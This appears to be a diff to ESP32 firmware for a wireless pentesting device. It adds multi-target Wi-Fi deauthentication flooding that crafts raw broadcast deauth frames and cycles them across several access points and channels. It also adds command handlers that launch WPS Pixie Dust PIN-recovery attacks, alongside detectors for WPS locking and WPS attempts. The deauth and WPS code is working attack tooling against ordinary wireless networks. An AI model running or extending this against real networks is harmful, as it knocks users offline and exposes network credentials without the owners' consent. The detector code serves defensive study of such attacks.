@@ -6,16 +6,20 @@
 #include "portal.h"
 #include "beacon.h"
 #include "deauth_detector.h"
+#include "DeauthMultiRules.h"
 #include "hidden_ap.h"
 #include "mesh.h"
 #include "pin_bruteforce.h"
 #include "ld2450.h"
 #include "ir_remote.h"
 #include "pn532_nfc.h"
+#include "wps_pixie.h"
+#include "wps_lock_detector.h"
+#include "wps_attempt_detector.h"
 #include "mbedtls/base64.h"
 #include "Preferences.h"
 
-#define FW_VERSION "1.0.0-beta.3"
+#define FW_VERSION "1.0.0-beta.3.1"
 
 #ifndef LD2450_BOOT_START
 #define LD2450_BOOT_START 0
@@ -67,6 +71,9 @@ MeshManager    mesh;
 Ld2450         ld2450;
 IrRemote       irRemote;
 Pn532Nfc       pn532Nfc;
+WpsPixieManager wpsPixie;
+WpsLockDetector wpsLockDetector;
+WpsAttemptDetector wpsAttemptDetector;
 #ifdef ENABLE_BLE_HID
 BleScanner bleScanner;
 BleProfile bleProfile;
@@ -200,7 +207,7 @@ static String regulatoryChannelError(uint8_t channel) {
     String error = "channel ";
     error += channel;
     error += " is not allowed by regulatory country ";
-    error += (cc[0] ? cc : "01");
+    error += (cc[0] ? cc : "CH");
     return error;
 }
 
@@ -227,23 +234,28 @@ static void appendAllowedWifiChannels(JsonDocument& doc) {
 
 static void applyStoredWifiCountry() {
     Preferences prefs;
-    String country = "01";
+    String country = "CH";
     if (prefs.begin("nrsuite", true)) {
-        country = prefs.getString("wifi_country", "01");
+        country = prefs.getString("wifi_country", "CH");
         prefs.end();
     }
     country.trim();
     country.toUpperCase();
-    if (country.length() != 2) country = "01";
+    if (country.length() != 2) country = "CH";
     const esp_err_t err = esp_wifi_set_country_code(country.c_str(), false);
     if (err != ESP_OK) {
         Serial.printf("WiFi country %s rejected: %s (%d)\n",
                       country.c_str(), esp_err_to_name(err), (int)err);
-        esp_wifi_set_country_code("01", false);
+        esp_wifi_set_country_code("CH", false);
     }
 }
 
-static bool configureWifiBand(const char* band, WifiBandMode& mode, String& error) {
+static bool configureWifiBand(
+    const char* band,
+    WifiBandMode& mode,
+    String& error,
+    bool applyHardwareMode = true
+) {
     const bool fiveSupported = isWifi5GhzEnabled();
 
     if (strcmp(band, "auto") == 0) {
@@ -262,48 +274,223 @@ static bool configureWifiBand(const char* band, WifiBandMode& mode, String& erro
     }
 
     #if defined(CONFIG_IDF_TARGET_ESP32C5)
-        if (mode == WifiBandMode::AUTO) {
-            esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
-        } else if (mode == WifiBandMode::BAND_5G) {
-            esp_wifi_set_band_mode(WIFI_BAND_MODE_5G_ONLY);
-        } else {
-            esp_wifi_set_band_mode(WIFI_BAND_MODE_2G_ONLY);
+        if (applyHardwareMode) {
+            esp_err_t err;
+            if (mode == WifiBandMode::AUTO) {
+                err = esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
+            } else if (mode == WifiBandMode::BAND_5G) {
+                err = esp_wifi_set_band_mode(WIFI_BAND_MODE_5G_ONLY);
+            } else {
+                err = esp_wifi_set_band_mode(WIFI_BAND_MODE_2G_ONLY);
+            }
+            if (err != ESP_OK) {
+                error = "band mode setup failed: ";
+                error += esp_err_to_name(err);
+                return false;
+            }
+            delay(80);
         }
     #endif
     return true;
 }
 
-static int idf_scan_networks(BridgeProtocol& proto) {
+static bool g_wifiScanInProgress = false;
+static uint32_t g_lastWifiScanEndMs = 0;
+static uint16_t g_lastWifiScanGoodCount = 0;
+static uint32_t g_lastWifiScanGoodMs = 0;
+static constexpr uint32_t WIFI_SCAN_DEFAULT_SETTLE_MS = 900;
+static constexpr uint32_t WIFI_SCAN_MIN_SETTLE_MS = 250;
+static constexpr uint32_t WIFI_SCAN_MAX_SETTLE_MS = 5000;
+static constexpr uint16_t WIFI_SCAN_MIN_DWELL_MS = 200;
+static constexpr uint16_t WIFI_SCAN_MAX_DWELL_MS = 1000;
+static constexpr uint32_t WIFI_SCAN_LOW_RESULT_WINDOW_MS = 60000;
+static constexpr uint8_t WIFI_SCAN_MAX_ATTEMPTS = 3;
+
+#if defined(CONFIG_IDF_TARGET_ESP32)
+// Classic ESP32 scans are noticeably less reliable with short active dwell
+// times. Give each channel a full 500 ms by default.
+static constexpr uint16_t WIFI_SCAN_DEFAULT_DWELL_MS = 500;
+#else
+static constexpr uint16_t WIFI_SCAN_DEFAULT_DWELL_MS = 300;
+#endif
+
+static bool scanResultLooksLow(uint16_t count) {
+    if (count == 0) return true;
+    if (g_lastWifiScanGoodCount < 3) return false;
+    if (millis() - g_lastWifiScanGoodMs > WIFI_SCAN_LOW_RESULT_WINDOW_MS) return false;
+    uint16_t lowThreshold = g_lastWifiScanGoodCount / 2;
+    if (lowThreshold < 2) lowThreshold = 2;
+    return count < lowThreshold;
+}
+
+static void finishWifiScan(bool stopScan) {
+    if (stopScan) esp_wifi_scan_stop();
+    g_wifiScanInProgress = false;
+    g_lastWifiScanEndMs = millis();
+}
+
+// Returns the number of APs found, or -1 on failure. The caller must call
+// finishWifiScan() after reading records on success. A concurrent scan request
+// returns -2 without disturbing the active one.
+static int idf_scan_networks(
+    BridgeProtocol& proto,
+    WifiBandMode bandMode,
+    uint32_t settleMs,
+    uint16_t dwellMs
+) {
     (void)proto;
+
+    if (g_wifiScanInProgress) {
+        Serial.println("SCAN_WIFI: rejected because another scan is already in progress");
+        return -2;
+    }
+    g_wifiScanInProgress = true;
+
+    #if defined(CONFIG_IDF_TARGET_ESP32C5)
+        // Keep the radio in AUTO band mode so the idle 2.4 GHz helper SoftAP
+        // does not prevent the STA interface from scanning 5 GHz. The channel
+        // bitmap below restricts the scan to the requested band.
+        const esp_err_t bandErr = esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
+        if (bandErr != ESP_OK) {
+            Serial.printf(
+                "SCAN_WIFI: failed to enable dual-band mode: %s (%d)\n",
+                esp_err_to_name(bandErr),
+                (int)bandErr
+            );
+            finishWifiScan(false);
+            return -1;
+        }
+        delay(80);
+    #endif
+
+    settleMs = constrain(settleMs, WIFI_SCAN_MIN_SETTLE_MS, WIFI_SCAN_MAX_SETTLE_MS);
+    const uint32_t sinceLastScanMs = millis() - g_lastWifiScanEndMs;
+    if (sinceLastScanMs < settleMs) {
+        const uint32_t waitMs = settleMs - sinceLastScanMs;
+        Serial.printf("SCAN_WIFI: settling for %lu ms before scan\n",
+                      (unsigned long)waitMs);
+        delay(waitMs);
+    }
+
+    uint16_t bitmap2g = 0;
+    uint32_t bitmap5g = 0;
+    if (bandMode != WifiBandMode::BAND_5G) {
+        for (uint8_t channel = 1; channel <= 14; ++channel) {
+            if (isChannelAllowedByCountry(channel)) {
+                bitmap2g |= (uint16_t)(1u << channel);
+            }
+        }
+    }
+    if (isWifi5GhzEnabled() && bandMode != WifiBandMode::BAND_2G) {
+        for (uint8_t channel : WIFI_5G_CHANNELS) {
+            if (!isChannelAllowedByCountry(channel)) continue;
+            const int bit = wifi5gChannelBit(channel);
+            if (bit > 0) bitmap5g |= (1u << bit);
+        }
+    }
 
     wifi_scan_config_t cfg = {};
     cfg.ssid        = nullptr;
     cfg.bssid       = nullptr;
     cfg.channel     = 0;
     cfg.show_hidden = true;
-    cfg.scan_type   = WIFI_SCAN_TYPE_ACTIVE;
-    cfg.scan_time.active.min = 100;
-    cfg.scan_time.active.max = 300;
+    cfg.scan_type   = bandMode == WifiBandMode::BAND_5G
+        ? WIFI_SCAN_TYPE_PASSIVE
+        : WIFI_SCAN_TYPE_ACTIVE;
+    uint16_t activeMinMs = static_cast<uint16_t>(dwellMs / 2);
+    if (activeMinMs < 100) activeMinMs = 100;
+    cfg.scan_time.active.min = activeMinMs;
+    cfg.scan_time.active.max = dwellMs;
+    cfg.scan_time.passive = dwellMs;
+    cfg.channel_bitmap.ghz_2_channels = bitmap2g;
+    cfg.channel_bitmap.ghz_5_channels = bitmap5g;
 
-    // Use ESP-IDF's blocking scan. The Arduino SCAN_DONE event path has
-    // proven unreliable on C5, leaving the command waiting until timeout.
-    esp_err_t err = esp_wifi_scan_start(&cfg, true);
-    if (err != ESP_OK) {
-        Serial.printf("SCAN_WIFI: esp_wifi_scan_start failed: %s (%d)\n",
-                      esp_err_to_name(err), (int)err);
+    Serial.printf(
+        "SCAN_WIFI: band=%s bitmap2g=0x%04X bitmap5g=0x%08X type=%s "
+        "settle_ms=%lu dwell_ms=%u active=%u-%u passive=%u\n",
+        wifiBandModeName(bandMode),
+        bitmap2g,
+        bitmap5g,
+        cfg.scan_type == WIFI_SCAN_TYPE_PASSIVE ? "passive" : "active",
+        (unsigned long)settleMs,
+        (unsigned)dwellMs,
+        (unsigned)cfg.scan_time.active.min,
+        (unsigned)cfg.scan_time.active.max,
+        (unsigned)cfg.scan_time.passive
+    );
+
+    for (uint8_t attempt = 1; attempt <= WIFI_SCAN_MAX_ATTEMPTS; ++attempt) {
+        // Clear any stale scan state left by a previous failed/aborted scan.
         esp_wifi_scan_stop();
-        return -1;
+        delay(50);
+
+        const uint32_t startedAt = millis();
+        Serial.printf("SCAN_WIFI: esp_wifi_scan_start attempt %u/%u\n",
+                      (unsigned)attempt, (unsigned)WIFI_SCAN_MAX_ATTEMPTS);
+        esp_err_t err = esp_wifi_scan_start(&cfg, true);
+        if (err != ESP_OK) {
+            Serial.printf(
+                "SCAN_WIFI: esp_wifi_scan_start attempt %u failed: %s (%d)\n",
+                (unsigned)attempt,
+                esp_err_to_name(err),
+                (int)err
+            );
+            if (attempt < WIFI_SCAN_MAX_ATTEMPTS &&
+                (err == ESP_ERR_WIFI_STATE || err == ESP_ERR_WIFI_NOT_STARTED)) {
+                esp_wifi_scan_stop();
+                delay(settleMs);
+                continue;
+            }
+            finishWifiScan(false);
+            return -1;
+        }
+
+        uint16_t count = 0;
+        err = esp_wifi_scan_get_ap_num(&count);
+        if (err != ESP_OK) {
+            Serial.printf(
+                "SCAN_WIFI: esp_wifi_scan_get_ap_num attempt %u failed: %s (%d)\n",
+                (unsigned)attempt,
+                esp_err_to_name(err),
+                (int)err
+            );
+            if (attempt < WIFI_SCAN_MAX_ATTEMPTS) {
+                esp_wifi_scan_stop();
+                delay(settleMs);
+                continue;
+            }
+            finishWifiScan(false);
+            return -1;
+        }
+
+        const bool lowResult = scanResultLooksLow(count);
+        Serial.printf(
+            "SCAN_WIFI: attempt %u complete in %lu ms, raw_count=%u "
+            "last_good=%u low_result=%s\n",
+            (unsigned)attempt,
+            (unsigned long)(millis() - startedAt),
+            (unsigned)count,
+            (unsigned)g_lastWifiScanGoodCount,
+            lowResult ? "yes" : "no"
+        );
+
+        if (lowResult && attempt < WIFI_SCAN_MAX_ATTEMPTS) {
+            Serial.println(
+                "SCAN_WIFI: empty/low result; retrying after settle"
+            );
+            esp_wifi_scan_stop();
+            delay(settleMs);
+            continue;
+        }
+        if (count > 0) {
+            g_lastWifiScanGoodCount = count;
+            g_lastWifiScanGoodMs = millis();
+        }
+        return (int)count;
     }
 
-    uint16_t count = 0;
-    err = esp_wifi_scan_get_ap_num(&count);
-    if (err != ESP_OK) {
-        Serial.printf("SCAN_WIFI: esp_wifi_scan_get_ap_num failed: %s (%d)\n",
-                      esp_err_to_name(err), (int)err);
-        esp_wifi_scan_stop();
-        return -1;
-    }
-    return (int)count;
+    finishWifiScan(false);
+    return -1;
 }
 
 static bool parseMac(const char* str, uint8_t out[6]) {
@@ -316,7 +503,13 @@ struct DeauthTxStats {
     uint32_t requested = 0;
     uint32_t sent = 0;
     uint32_t failed = 0;
+    uint32_t elapsedMs = 0;
 };
+
+static float framesPerSecond(uint32_t frames, uint32_t elapsedMs) {
+    if (elapsedMs == 0) return 0.0f;
+    return (static_cast<float>(frames) * 1000.0f) / static_cast<float>(elapsedMs);
+}
 
 static DeauthTxStats transmitDeauthFrames(
     const uint8_t bssid[6],
@@ -327,6 +520,7 @@ static DeauthTxStats transmitDeauthFrames(
 ) {
     DeauthTxStats stats;
     stats.requested = count;
+    const uint32_t startedMs = millis();
 
     uint8_t deauthFrame[26] = {
         0xC0, 0x00, 0x00, 0x00,
@@ -352,6 +546,7 @@ static DeauthTxStats transmitDeauthFrames(
         seq += 0x0010;
         if (intervalMs > 0 && i + 1 < count) delay(intervalMs);
     }
+    stats.elapsedMs = millis() - startedMs;
     return stats;
 }
 
@@ -375,7 +570,10 @@ static void sendDeauthLoopStatsEvent(const char* status, bool stopped) {
     ev["failed_frames"] = gDeauthLoopFailed;
     ev["duration_s"] = gDeauthLoopDurationSec;
     ev["interval_ms"] = gDeauthLoopIntervalMs;
-    ev["elapsed_ms"] = gDeauthLoopStartedMs == 0 ? 0 : (millis() - gDeauthLoopStartedMs);
+    const uint32_t elapsedMs =
+        gDeauthLoopStartedMs == 0 ? 0 : (millis() - gDeauthLoopStartedMs);
+    ev["elapsed_ms"] = elapsedMs;
+    ev["pps"] = framesPerSecond(gDeauthLoopSent, elapsedMs);
     ev["stopped"] = stopped;
     proto.sendEvent("deauth_stats", ev);
 }
@@ -442,6 +640,287 @@ static void stopDeauthLoopAndWait(uint32_t timeoutMs = 1200) {
     if (!gDeauthLoopActive) gDeauthLoopTaskHandle = nullptr;
 }
 
+// ── DEAUTH_MULTI ──────────────────────────────────────────────────────────────
+struct DeauthMultiTarget {
+    uint8_t bssid[6] = {};
+    uint8_t channel = 0;
+    uint32_t requested = 0;
+    uint32_t sent = 0;
+    uint32_t failed = 0;
+};
+
+static DeauthMultiTarget gDeauthMultiTargets[deauth_multi::kMaxTargets] = {};
+static size_t gDeauthMultiTargetCount = 0;
+static uint8_t gDeauthMultiClient[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+static uint32_t gDeauthMultiCountPerTarget = 1;
+static uint32_t gDeauthMultiDurationSec = 0;
+static uint16_t gDeauthMultiIntervalMs = deauth_multi::kDefaultIntervalMs;
+static uint8_t gDeauthMultiReason = 7;
+static volatile bool gDeauthMultiActive = false;
+static volatile bool gDeauthMultiStopRequested = false;
+static TaskHandle_t gDeauthMultiTaskHandle = nullptr;
+static uint32_t gDeauthMultiStartedMs = 0;
+static uint32_t gDeauthMultiSent = 0;
+static uint32_t gDeauthMultiFailed = 0;
+static uint8_t gDeauthMultiCurrentChannel = 0;
+static char gDeauthMultiCurrentBssid[18] = {0};
+
+static void formatDeauthMultiMac(const uint8_t mac[6], char out[18]) {
+    snprintf(
+        out,
+        18,
+        "%02X:%02X:%02X:%02X:%02X:%02X",
+        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]
+    );
+}
+
+static bool prepareDeauthMultiChannel(uint8_t channel, String& error) {
+    if (!isValidWifiChannel(channel)) {
+        error = "invalid channel";
+        return false;
+    }
+    if (!validateRegulatoryChannel(channel, error)) {
+        return false;
+    }
+
+    const char* band = channel <= 14 ? "2g" : "5g";
+    WifiBandMode bandMode = WifiBandMode::BAND_2G;
+    String bandError;
+    if (!configureWifiBand(band, bandMode, bandError)) {
+        error = bandError;
+        return false;
+    }
+
+    esp_err_t setupErr = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    if (setupErr != ESP_OK) {
+        error = "channel set failed: ";
+        error += esp_err_to_name(setupErr);
+        return false;
+    }
+
+    wifi_config_t apCfg = {};
+    setupErr = esp_wifi_get_config(WIFI_IF_AP, &apCfg);
+    if (setupErr == ESP_OK) {
+        apCfg.ap.channel = channel;
+        setupErr = esp_wifi_set_config(WIFI_IF_AP, &apCfg);
+    }
+    if (setupErr == ESP_OK) {
+        setupErr = esp_wifi_start();
+    }
+    if (setupErr != ESP_OK && setupErr != ESP_ERR_WIFI_STATE) {
+        error = "WiFi setup failed: ";
+        error += esp_err_to_name(setupErr);
+        return false;
+    }
+    delay(20);
+    return true;
+}
+
+static bool sendDeauthMultiFrame(
+    const DeauthMultiTarget& target,
+    uint16_t sequence,
+    uint8_t reason
+) {
+    uint8_t frame[26] = {
+        0xC0, 0x00, 0x00, 0x00,
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x07
+    };
+    memcpy(frame + 4, gDeauthMultiClient, 6);
+    memcpy(frame + 10, target.bssid, 6);
+    memcpy(frame + 16, target.bssid, 6);
+    frame[22] = sequence & 0xFF;
+    frame[23] = (sequence >> 8) & 0xFF;
+    frame[25] = reason;
+    return esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), true) == ESP_OK;
+}
+
+static uint32_t deauthMultiRequestedTotal() {
+    uint32_t total = 0;
+    for (size_t i = 0; i < gDeauthMultiTargetCount; ++i) {
+        total += gDeauthMultiTargets[i].requested;
+    }
+    return total;
+}
+
+static void appendDeauthMultiTargets(JsonDocument& doc) {
+    JsonArray targets = doc["targets"].to<JsonArray>();
+    for (size_t i = 0; i < gDeauthMultiTargetCount; ++i) {
+        const DeauthMultiTarget& target = gDeauthMultiTargets[i];
+        char bssid[18];
+        formatDeauthMultiMac(target.bssid, bssid);
+        JsonObject entry = targets.add<JsonObject>();
+        entry["bssid"] = bssid;
+        entry["channel"] = target.channel;
+        entry["requested_frames"] = target.requested;
+        entry["sent_frames"] = target.sent;
+        entry["failed_frames"] = target.failed;
+    }
+}
+
+static void sendDeauthMultiStatsEvent(const char* status, bool stopped) {
+    JsonDocument ev;
+    ev["status"] = status;
+    ev["mode"] = "multi";
+    ev["target_count"] = gDeauthMultiTargetCount;
+    ev["requested_frames"] = deauthMultiRequestedTotal();
+    ev["sent_frames"] = gDeauthMultiSent;
+    ev["failed_frames"] = gDeauthMultiFailed;
+    ev["duration_s"] = gDeauthMultiDurationSec;
+    ev["interval_ms"] = gDeauthMultiIntervalMs;
+    ev["channel"] = gDeauthMultiCurrentChannel;
+    if (gDeauthMultiCurrentBssid[0] != '\0') {
+        ev["target_bssid"] = gDeauthMultiCurrentBssid;
+    }
+    const uint32_t elapsedMs =
+        gDeauthMultiStartedMs == 0 ? 0 : (millis() - gDeauthMultiStartedMs);
+    ev["elapsed_ms"] = elapsedMs;
+    ev["pps"] = framesPerSecond(gDeauthMultiSent, elapsedMs);
+    ev["stopped"] = stopped;
+    appendDeauthMultiTargets(ev);
+    proto.sendEvent("deauth_stats", ev);
+}
+
+static void deauthMultiTaskFn(void*) {
+    const uint32_t durationMs = gDeauthMultiDurationSec * 1000UL;
+    uint16_t sequence = 0x0010;
+    uint32_t lastStatsMs = millis();
+
+    while (!gDeauthMultiStopRequested) {
+        const uint32_t cycleElapsedMs = millis() - gDeauthMultiStartedMs;
+        if (durationMs > 0 && cycleElapsedMs >= durationMs) break;
+
+        for (size_t targetIndex = 0;
+             targetIndex < gDeauthMultiTargetCount && !gDeauthMultiStopRequested;
+             ++targetIndex) {
+            DeauthMultiTarget& target = gDeauthMultiTargets[targetIndex];
+            gDeauthMultiCurrentChannel = target.channel;
+            formatDeauthMultiMac(target.bssid, gDeauthMultiCurrentBssid);
+
+            String channelError;
+            if (!prepareDeauthMultiChannel(target.channel, channelError)) {
+                const uint32_t attempted = gDeauthMultiCountPerTarget;
+                target.requested += attempted;
+                target.failed += attempted;
+                gDeauthMultiFailed += attempted;
+                Serial.printf(
+                    "DEAUTH_MULTI: target %s channel %u setup failed: %s\n",
+                    gDeauthMultiCurrentBssid,
+                    target.channel,
+                    channelError.c_str()
+                );
+                continue;
+            }
+
+            for (uint32_t frameIndex = 0;
+                 frameIndex < gDeauthMultiCountPerTarget && !gDeauthMultiStopRequested;
+                 ++frameIndex) {
+                const uint32_t elapsedMs = millis() - gDeauthMultiStartedMs;
+                if (durationMs > 0 && elapsedMs >= durationMs) break;
+
+                target.requested++;
+                if (sendDeauthMultiFrame(target, sequence, gDeauthMultiReason)) {
+                    target.sent++;
+                    gDeauthMultiSent++;
+                } else {
+                    target.failed++;
+                    gDeauthMultiFailed++;
+                }
+                sequence += 0x0010;
+
+                if (millis() - lastStatsMs >= 2000) {
+                    lastStatsMs = millis();
+                    sendDeauthMultiStatsEvent("running", false);
+                }
+
+                if (frameIndex + 1 < gDeauthMultiCountPerTarget) {
+                    uint32_t sleepMs = gDeauthMultiIntervalMs;
+                    if (durationMs > 0) {
+                        const uint32_t nowElapsedMs = millis() - gDeauthMultiStartedMs;
+                        const uint32_t remainingMs = durationMs > nowElapsedMs
+                            ? durationMs - nowElapsedMs
+                            : 0;
+                        if (remainingMs < sleepMs) sleepMs = remainingMs;
+                    }
+                    if (sleepMs > 0) vTaskDelay(pdMS_TO_TICKS(sleepMs));
+                    else vTaskDelay(pdMS_TO_TICKS(1));
+                }
+            }
+        }
+
+        if (gDeauthMultiStopRequested) break;
+        if (durationMs > 0 && millis() - gDeauthMultiStartedMs >= durationMs) break;
+        vTaskDelay(pdMS_TO_TICKS(1));
+    }
+
+    gDeauthMultiActive = false;
+    sendDeauthMultiStatsEvent("finished", gDeauthMultiStopRequested);
+    gDeauthMultiTaskHandle = nullptr;
+    vTaskDelete(nullptr);
+}
+
+static void stopDeauthMultiLoopAndWait(uint32_t timeoutMs = 1500) {
+    if (!gDeauthMultiActive && gDeauthMultiTaskHandle == nullptr) return;
+    gDeauthMultiStopRequested = true;
+    const uint32_t started = millis();
+    while (gDeauthMultiActive && millis() - started < timeoutMs) {
+        delay(10);
+    }
+    if (!gDeauthMultiActive) gDeauthMultiTaskHandle = nullptr;
+}
+
+static void runDeauthMultiBurst() {
+    gDeauthMultiStartedMs = millis();
+    gDeauthMultiSent = 0;
+    gDeauthMultiFailed = 0;
+    gDeauthMultiCurrentChannel = 0;
+    gDeauthMultiCurrentBssid[0] = '\0';
+    for (size_t i = 0; i < gDeauthMultiTargetCount; ++i) {
+        gDeauthMultiTargets[i].requested = 0;
+        gDeauthMultiTargets[i].sent = 0;
+        gDeauthMultiTargets[i].failed = 0;
+    }
+
+    uint16_t sequence = 0x0010;
+    for (size_t targetIndex = 0; targetIndex < gDeauthMultiTargetCount; ++targetIndex) {
+        DeauthMultiTarget& target = gDeauthMultiTargets[targetIndex];
+        gDeauthMultiCurrentChannel = target.channel;
+        formatDeauthMultiMac(target.bssid, gDeauthMultiCurrentBssid);
+
+        String channelError;
+        if (!prepareDeauthMultiChannel(target.channel, channelError)) {
+            target.requested += gDeauthMultiCountPerTarget;
+            target.failed += gDeauthMultiCountPerTarget;
+            gDeauthMultiFailed += gDeauthMultiCountPerTarget;
+            Serial.printf(
+                "DEAUTH_MULTI: target %s channel %u setup failed: %s\n",
+                gDeauthMultiCurrentBssid,
+                target.channel,
+                channelError.c_str()
+            );
+            continue;
+        }
+
+        for (uint32_t frameIndex = 0; frameIndex < gDeauthMultiCountPerTarget; ++frameIndex) {
+            target.requested++;
+            if (sendDeauthMultiFrame(target, sequence, gDeauthMultiReason)) {
+                target.sent++;
+                gDeauthMultiSent++;
+            } else {
+                target.failed++;
+                gDeauthMultiFailed++;
+            }
+            sequence += 0x0010;
+            if (frameIndex + 1 < gDeauthMultiCountPerTarget && gDeauthMultiIntervalMs > 0) {
+                delay(gDeauthMultiIntervalMs);
+            }
+        }
+    }
+    sendDeauthMultiStatsEvent("finished", false);
+}
+
 static const char* authModeStr(wifi_auth_mode_t mode) {
     switch (mode) {
         case WIFI_AUTH_OPEN:            return "OPEN";
@@ -461,12 +940,15 @@ static const char* authModeStr(wifi_auth_mode_t mode) {
 // Call this at the top of any CMD that touches Wi-Fi TX/RX.
 static void stopRadioModules() {
     stopDeauthLoopAndWait();
+    stopDeauthMultiLoopAndWait();
     mesh.stop();
     sniffer.stop();
     deauthDetector.stop();
     hiddenApDetector.stop();
     beacon.stop();
     portal.stop();
+    wpsPixie.stop();
+    wpsAttemptDetector.stop();
     esp_wifi_set_promiscuous(false);
 }
 
@@ -500,8 +982,17 @@ static void radioIdle() {
 
 // ── LD2450 command/event layer ────────────────────────────────────────────────
 static constexpr uint32_t LD2450_BAUD = 256000;
+
+#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C5)
+static constexpr int8_t LD2450_DEFAULT_RX_PIN = 6;
+static constexpr int8_t LD2450_DEFAULT_TX_PIN = 7;
+#elif defined(CONFIG_IDF_TARGET_ESP32S3) || defined(CONFIG_IDF_TARGET_ESP32S2)
 static constexpr int8_t LD2450_DEFAULT_RX_PIN = 16;
 static constexpr int8_t LD2450_DEFAULT_TX_PIN = 17;
+#else
+static constexpr int8_t LD2450_DEFAULT_RX_PIN = 18;
+static constexpr int8_t LD2450_DEFAULT_TX_PIN = 19;
+#endif
 
 #if defined(CONFIG_IDF_TARGET_ESP32C3)
 static const int SAFE_LD2450_GPIOS[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10};
@@ -551,11 +1042,15 @@ static void loadLd2450Config() {
         txPin = prefs.getInt("ld2450_tx_gpio", LD2450_DEFAULT_TX_PIN);
         prefs.end();
     }
-    ld2450RxGpio = isSafeLd2450Pin(rxPin) ? rxPin : -1;
-    ld2450TxGpio = isSafeLd2450Pin(txPin) ? txPin : -1;
+    // Preserve target-safe defaults when NVS is blank or contains the old
+    // -1 "unset" sentinel.
+    if (rxPin < 0 || !isSafeLd2450Pin(rxPin)) rxPin = LD2450_DEFAULT_RX_PIN;
+    if (txPin < 0 || !isSafeLd2450Pin(txPin)) txPin = LD2450_DEFAULT_TX_PIN;
+    ld2450RxGpio = rxPin;
+    ld2450TxGpio = txPin;
     if (ld2450RxGpio == ld2450TxGpio) {
-        ld2450RxGpio = -1;
-        ld2450TxGpio = -1;
+        ld2450RxGpio = LD2450_DEFAULT_RX_PIN;
+        ld2450TxGpio = LD2450_DEFAULT_TX_PIN;
     }
 }
 
@@ -748,6 +1243,205 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
         proto.sendResp(id, true, "pong");
     }
 
+    // ── WPS PIXIE DUST ────────────────────────────────────────────────────
+    else if (strcmp(cmd, "WPS_PIXIE_ATTEMPT") == 0) {
+        if (!wpsPixieSupported()) {
+            proto.sendResp(id, false, "wps_pixie_not_supported");
+            return;
+        }
+        String bssid = doc["args"]["bssid"] | "";
+        String ssid = doc["args"]["ssid"] | "";
+        String pin = doc["args"]["pin"] | "";
+        String runId = doc["args"]["run_id"] | "";
+        const bool captureOnly = doc["args"]["capture_only"] | false;
+        const bool reuseMac = doc["args"]["reuse_mac"] | false;
+        int channel = doc["args"]["channel"] | 0;
+        bssid.trim();
+        bssid.toUpperCase();
+        ssid.trim();
+        pin.trim();
+        if (runId.isEmpty()) {
+            char idBuffer[24];
+            snprintf(idBuffer, sizeof(idBuffer), "wps%08x", (unsigned)esp_random());
+            runId = idBuffer;
+        }
+        if (bssid.isEmpty() || ssid.isEmpty() || pin.isEmpty() || channel < 1 || channel > 177) {
+            proto.sendResp(id, false, "invalid WPS target or PIN");
+            return;
+        }
+
+        stopAllModules();
+        String error;
+        if (!wpsPixie.startAttempt(
+                bssid, ssid, (uint8_t)channel, pin, runId, captureOnly, reuseMac, error)) {
+            JsonDocument resp;
+            resp["ok"] = false;
+            resp["error"] = error;
+            String json;
+            serializeJson(resp, json);
+            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
+            return;
+        }
+
+        JsonDocument resp;
+        resp["ok"] = true;
+        resp["run_id"] = runId;
+        String json;
+        serializeJson(resp, json);
+        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
+    }
+
+    else if (strcmp(cmd, "WPS_PIXIE_CONTINUE") == 0) {
+        String runId = doc["args"]["run_id"] | "";
+        String pin = doc["args"]["pin"] | "";
+        runId.trim();
+        pin.trim();
+        String error;
+        if (!wpsPixie.continueWithRecoveredPin(runId, pin, error)) {
+            JsonDocument resp;
+            resp["ok"] = false;
+            resp["error"] = error;
+            String json;
+            serializeJson(resp, json);
+            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
+            return;
+        }
+        JsonDocument resp;
+        resp["ok"] = true;
+        String json;
+        serializeJson(resp, json);
+        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
+    }
+
+    else if (strcmp(cmd, "WPS_PIXIE_STOP") == 0) {
+        wpsPixie.stop();
+        JsonDocument resp;
+        resp["ok"] = true;
+        String json;
+        serializeJson(resp, json);
+        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
+    }
+
+    // ── WPS LOCK DETECTOR ─────────────────────────────────────────────────
+    else if (strcmp(cmd, "WPS_LOCK_SCAN") == 0) {
+        const char* band = doc["args"]["band"] | "auto";
+        WifiBandMode bandMode = WifiBandMode::BAND_2G;
+        String bandError;
+        if (!configureWifiBand(band, bandMode, bandError)) {
+            proto.sendResp(id, false, bandError.c_str());
+            return;
+        }
+        uint16_t dwellMs = doc["args"]["dwell_ms"] | 120;
+        dwellMs = (uint16_t)constrain(dwellMs, 60, 1000);
+        radioIdle();
+        const int count = wpsLockDetector.scan(
+            bandMode != WifiBandMode::BAND_2G,
+            dwellMs
+        );
+        JsonDocument resp;
+        resp["ok"] = true;
+        resp["count"] = count;
+        String json;
+        serializeJson(resp, json);
+        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
+    }
+
+    // ── WPS ATTEMPT DETECTOR ──────────────────────────────────────────────
+    else if (strcmp(cmd, "WPS_ATTEMPT_DETECT_START") == 0) {
+        const char* band = doc["args"]["band"] | "auto";
+        WifiBandMode bandMode = WifiBandMode::BAND_2G;
+        String bandError;
+        if (!configureWifiBand(band, bandMode, bandError)) {
+            proto.sendResp(id, false, bandError.c_str());
+            return;
+        }
+
+        uint8_t channels[64] = {};
+        size_t channelCount = 0;
+        JsonArray channelsArray = doc["args"]["channels"].as<JsonArray>();
